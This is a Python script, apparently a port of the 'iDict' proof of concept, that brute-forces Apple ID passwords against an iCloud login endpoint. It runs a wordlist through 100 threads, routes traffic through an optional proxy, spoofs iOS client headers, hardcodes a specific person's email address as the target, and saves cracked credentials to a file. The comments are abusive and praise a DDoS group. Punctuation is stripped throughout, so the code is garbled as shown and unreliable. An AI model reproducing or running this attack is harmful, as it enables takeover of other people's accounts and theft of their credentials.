
A shitty hacked together Python version of this: https://github.com/Pr0x13/iDict

Prerequisites:
	requests
	threadpool

Both can be installed via pip or easy_install.
Im not your mother, so I dont feel like I should have to explain how to get them.

Shoutout to @sanitybit the inventor of the DDoS and leader of LizardSquad, who will one day be my waifu



import requests
import threadpool
import time I AM ZILEAN

disable those annoying as fuck urllib3 WAAAH NO SSL warnings.
requests.packages.urllib3.disable_warningstrue

hack the planet step 1
def getConfigtrue:
	headers = 
		User-Agent : Settings/1.0 CFNetwork/672.0.8 Darwin/14.0.0,
		Proxy-Connection : Keep-Alive,
		Accept : */*,
		Accept-Encoding : gzip, deflate,
		Accept-Language : en-us,
		X-MMe-Country : US,
		Connection : keep-alive,
		X-MMe-Client-Info : <iPhone4,1> <iPhone OS;11.8;17E8260> <com.apple.AppleAccount/1.0 com.apple.Preferences/1.0>,
	
	response = requests.gethttps://setup.icloud.com/configurations/initcontext=settings, headers = headers, verify = False
	if response.status_code == 200:
		config = response.content
		Error handling is for pussies
		Im a hacker and this is lulzsec
		Why the fuck did the dude fetch the 23rd URL from this response
		https://setup.icloud.com/setup/iosbuddy/loginDelegates was the URL... man, original PoC might have autism..
		IF ITS STATIC JUST DEFINE IT AS SUCH. NO NEED TO TRY AND SHOW OFF YOUR XML TREE PARSING WIZARDRY WITH
		CRAZY ONE-LINERS LIKE $xml = simplexml_load_string$plist
		fuckin haxors, man. I tell ya hwat.
		f = openconfig.plist,w
		f.writeconfig
		f.closetrue
		print We just fetched the ever-loving shit out of the config file because who the fuck knows why
	else: config file
		print Da fuck happened breh HTTP status wasnt 200 for the config file fetching shit.

hack the planet step 2
just replacing the shit for the request. Why is XML still relevant again, guys
def prepareLoginapple_id, password, buffer: worldlist.txt
	you dont even know nothin about my muhfuckin string replacement game untouchable
	buffer = buffer.replaceapple_id, apple_id
	buffer = buffer.replacepassword, password
	return buffer

lets execute some muh-fuckin hacker requests
10 bonus points if you accidentally perform a successful pikachu paket exploit on jukens TI-82
def doLoginpayload:
	apple_id, password, buffer, proxy = payload
	buffer = prepareLoginapple_id, password, buffer SHIEEEEEEEEET
	headers = 
		User-Agent : Settings/1.0 CFNetwork/672.0.8 Darwin/14.0.0,
		Proxy-Connection : keep-alive,
		Accept : */*,
		Accept-Encoding : gzip, deflate,
		Content-Type : text/plist,
		Accept-Language : en-us,
		X-MMe-Country : US,
		X-MMe-Client-Info : <iPhone4,1> <iPhone OS;7.0.4;11B554a> <com.apple.AppleAccount/1.0 com.apple.Accounts/113>,
		Connection : keep-alive
	
	response = requests.posthttps://setup.icloud.com/setup/iosbuddy/loginDelegates, headers = headers, data = buffer, verify = False, proxies = proxy
	if response.status_code == 200:
		if delegates in response.content:
			print 1337 Hacking Success %s:%s % apple_id, password
			gs = opengovernment_secrets.txt,w
			gs.write/n%s:%s % apple_id, password
			gs.close
		else:
			print Shitballs. Login for %s:%s was false as fuck... % apple_id, password
			return False
	else:
		print Login Error: Status code wasnt 200
		return False


hack the planet
if __name__ == __main__:

	PUT THE FUCKING APPLE ID HERE
	apple_id = tischer87anja@icloud.com

	NOTE: i do not condone hacking government officials or anything else that you redditors do in your free time.
	Im looking at you, Mr. Guido

	Use a proxy or something, dumbass
	proxy = None
	proxy = 
		http : http://ip:port
		https : http://ip:port
	

	getConfigtrue Not sure why the original PoC guy is even doing this...

	LOAD DA LISTSSSSS
	wordlist = openwordlist.txt,r.readr.split/n
	blank_payload = openblank_payload.plist,r.readr

	thread_count = 100

	pool = threadpool.ThreadPoolthread_count
	queue_arguments =   

	for password in wordlist:
		password = password.striptruebecause fuck whitespace
		queue_arguments.append apple_id,password,blank_payload,proxy 

	hacking_attempts = threadpool.makeRequestsdoLogin, queue_arguments
	for hacks in hacking_attempts:
		pool.putRequesthacks
	pool.wait
	print Sleeping for 5 seconds because threadpool is a bag of big, beautiful dicks
	time.sleep5
	exittrue real hackers use this function



